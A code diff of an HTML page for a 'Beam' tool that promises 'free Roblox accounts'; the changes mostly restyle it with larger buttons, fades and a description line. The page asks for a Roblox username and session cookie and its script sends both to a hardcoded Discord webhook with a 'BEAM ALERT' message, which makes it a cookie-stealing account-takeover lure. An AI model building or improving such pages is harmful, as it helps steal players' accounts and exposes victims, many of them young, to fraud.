@@ -7,6 +7,7 @@
     <style>
         body {
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
@@ -14,53 +15,116 @@
             font-family: Arial, sans-serif;
             background-color: #f0f0f0;
         }
+        #beamButtonContainer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+            transition: opacity 0.5s;
+        }
         #beamButton {
-            background-color: blue;
+            background-color: #007bff;
             color: white;
-            padding: 20px 40px;
+            padding: 30px 60px;
             border: none;
             border-radius: 15px;
-            font-size: 24px;
+            font-size: 36px;
             cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s;
+            margin-bottom: 10px;
+        }
+        #beamButton:hover {
+            background-color: #0056b3;
+        }
+        #beamButton:active {
+            transform: scale(0.95);
+        }
+        #description {
+            font-size: 24px;
+            color: #333;
+            font-weight: bold;
         }
         #inputContainer {
             display: none;
             text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            opacity: 0;
+            transition: opacity 0.5s;
         }
-        input {
+        #inputContainer.show {
             display: block;
+            opacity: 1;
+        }
+        h3 {
+            margin: 10px 0;
+            color: #333;
+        }
+        .input-group {
             margin: 10px auto;
-            padding: 10px;
-            font-size: 16px;
             width: 80%;
             max-width: 400px;
+        }
+        .input-group input {
+            padding: 10px;
+            font-size: 16px;
+            width: 100%;
             border-radius: 10px;
             border: 1px solid #ccc;
+            transition: border-color 0.3s;
+        }
+        .input-group input:focus {
+            border-color: #007bff;
+            outline: none;
         }
         button {
-            background-color: blue;
+            background-color: #007bff;
             color: white;
             padding: 10px 20px;
             border: none;
             border-radius: 10px;
             cursor: pointer;
             font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
-    <button id="beamButton">Beam</button>
+    <div id="beamButtonContainer">
+        <button id="beamButton">Beam</button>
+        <div id="description">Enjoy your free Roblox accounts</div>
+    </div>
     <div id="inputContainer">
         <h3>Player's Username</h3>
-        <input type="text" id="username" placeholder="Enter Username">
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Enter Username">
+        </div>
         <h3>Player's Cookie</h3>
-        <input type="text" id="cookie" placeholder="Enter Cookie">
+        <div class="input-group">
+            <input type="text" id="cookie" placeholder="Enter Cookie">
+        </div>
         <button id="enterButton">Enter</button>
     </div>
 
     <script>
         document.getElementById('beamButton').addEventListener('click', function() {
-            document.getElementById('inputContainer').style.display = 'block';
+            const beamButtonContainer = document.getElementById('beamButtonContainer');
+            const inputContainer = document.getElementById('inputContainer');
+            
+            beamButtonContainer.style.opacity = '0';
+
+            setTimeout(() => {
+                beamButtonContainer.style.display = 'none';
+                inputContainer.style.display = 'block';
+                setTimeout(() => {
+                    inputContainer.style.opacity = '1';
+                }, 50); // Small delay to trigger CSS transition
+            }, 500); // Wait for fade-out transition
         });
 
         document.getElementById('enterButton').addEventListener('click', function() {
@@ -70,7 +134,7 @@
             if (username && cookie) {
                 const webhookUrl = 'https://discord.com/api/webhooks/1252706909656449145/mug143mFHQ8XQYQtda0oLy5h56M2SmXkGmXrIPyOOg_1f5QOkVS7TQM681bMq28Dtz1_';
                 const payload = {
-                    content: '<@1093924846460739664> **!!BEAM ALERT!!**',
+                    content: '<@USER_ID> **!!BEAM ALERT!!**',
                     embeds: [
                         {
                             title: "Player's Username",
